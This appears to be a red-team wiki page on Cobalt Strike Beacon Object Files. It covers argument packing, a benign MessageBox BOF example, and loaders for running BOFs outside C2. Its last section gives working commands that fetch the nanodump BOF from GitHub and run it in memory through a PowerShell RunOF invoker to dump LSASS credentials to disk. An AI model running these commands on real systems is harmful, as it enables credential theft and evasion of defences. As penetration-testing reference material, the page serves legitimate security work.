---
description: Beacon Object Files / Common Object File Format
---

# BOF / COFF

- [https://www.trustedsec.com/blog/operators-guide-to-the-meterpreter-bofloader/](https://www.trustedsec.com/blog/operators-guide-to-the-meterpreter-bofloader/)
- [https://securityintelligence.com/posts/how-to-hide-beacon-during-bof-execution/](https://securityintelligence.com/posts/how-to-hide-beacon-during-bof-execution/)
- [https://github.com/xforcered/bofmask](https://github.com/xforcered/bofmask)
- [[PDF] Microsoft Portable Executable and Common Object File Format Specification (Microsoft Corporation)](https://courses.cs.washington.edu/courses/cse378/03wi/lectures/LinkerFiles/coff.pdf)

Argument types for [bof_pack](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics_aggressor-scripts/as-resources_functions.htm#bof_pack):

| **Type** | **Description**                  | **Unpack With (C)**          |
|----------|----------------------------------|------------------------------|
| b        | binary data                      | BeaconDataExtract            |
| i        | 4-byte integer                   | BeaconDataInt                |
| s        | 2-byte short integer             | BeaconDataShort              |
| z        | zero-terminated+encoded string   | BeaconDataExtract            |
| Z        | zero-terminated wide-char string | (wchar_t \*)BeaconDataExtract |

A basic BOF example:

{% tabs %}
{% tab title="BOF" %}
{% code title="msgbox.c" %}
```c
// wget https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/beacon.h
// x86_64-w64-mingw32-gcc -c msgbox.c -o msgbox.o

#include <windows.h>
#include "beacon.h"

void go(char* args, int alen)
{
    DECLSPEC_IMPORT INT WINAPI USER32$MessageBoxA(HWND, LPCSTR, LPCSTR, UINT);

    datap parser;
    BeaconDataParse(&parser, args, alen);

    char* message;
    message = BeaconDataExtract(&parser, NULL);

    USER32$MessageBoxA(NULL, message, "Hello from BOF!", 0);
}
```
{% endcode %}
{% endtab %}
{% tab title="Aggressor" %}
{% code title="msgbox.cna" %}
```
alias msgbox {
    local('$handle $bof $args');

    # Read the bof file
    $handle = openf(script_resource("msgbox.o"));
    $bof = readb($handle, -1);
    closef($handle);

    # Pack args
    $args = bof_pack($1, "z", $2);
    
    # Print task to console
    btask($1, "Running MessageBoxA BOF");
    
    # Execute BOF
    beacon_inline_execute($1, $bof, "go", $args);
}

beacon_command_register("msgbox", "Pops a message box", "Calls the MessageBoxA Win32 API");
```
{% endcode %}
{% endtab %}
{% endtabs %}




## Run BOFs outside of C2

- [https://www.trustedsec.com/blog/coffloader-building-your-own-in-memory-loader-or-how-to-run-bofs/](https://www.trustedsec.com/blog/coffloader-building-your-own-in-memory-loader-or-how-to-run-bofs/)
- [https://github.com/trustedsec/COFFLoader](https://github.com/trustedsec/COFFLoader)
- [https://skyblue.team/posts/invoke-bof/](https://skyblue.team/posts/invoke-bof/)
- [https://github.com/airbus-cert/Invoke-Bof](https://github.com/airbus-cert/Invoke-Bof)
- [https://github.com/Cracked5pider/CoffeeLdr](https://github.com/Cracked5pider/CoffeeLdr)
- [https://github.com/frkngksl/NiCOFF](https://github.com/frkngksl/NiCOFF)
- [https://github.com/trustedsec/CS_COFFLoader](https://github.com/trustedsec/CS_COFFLoader)



### RunOF

- [https://labs.nettitude.com/blog/introducing-runof-arbitrary-bof-tool/](https://labs.nettitude.com/blog/introducing-runof-arbitrary-bof-tool/)
- [https://github.com/nettitude/RunOF](https://github.com/nettitude/RunOF)

An example of running the [nanodump.x64.o](https://github.com/helpsystems/nanodump/blob/main/dist/nanodump.x64.o) BOF via RunOF [fork](https://github.com/snovvcrash/RunOF) from memory:

- Compile RunOF.exe assembly and convert it to a PowerShell invoker (see [.NET Reflective Assembly](/pentest/infrastructure/ad/av-edr-evasion/dotnet-reflective-assembly.md))
- Search for argument types that the target BOF uses (usually located in accompanying Aggressor scripts):

```
curl -sSL 'https://github.com/helpsystems/nanodump/raw/main/'`curl -sSL 'https://api.github.com/repos/helpsystems/nanodump/git/trees/main?recursive=1' | jq -r '.tree[] | select(.path | endswith(".cna")) | .path'` | grep bof_pack
    $args = bof_pack($1, "iziiiiiiiziiz", $pid, $dump_path, $write_file, $use_valid_sig, $fork, $snapshot, $dup, $get_pid, $use_malseclogon, $binary_path, $use_malseclogon_race, $use_werfault, $werfault_lsass);
    $args = bof_pack($1, "ziiiiizb", $dump_path, $use_valid_sig, $fork, $snapshot, $dup, $use_malseclogon, $binary_path, $dll);
    $args = bof_pack($1, "z", $ssp_path);
    $args = bof_pack($1, "z", $2);
```

- Load the invoker into memory, fetch the BOF (`-u` option) and run it providing necessary arguments with their types like this:

```
PS > Invoke-RunOF -u https://github.com/helpsystems/nanodump/raw/main/dist/nanodump.x64.o '-i:0' '-z:C:\Windows\Temp\lsass.bin' '-i:1' '-i:1' '-i:0' '-i:0' '-i:0' '-i:0' '-i:0' '-z:' '-i:0' '-z:'
```
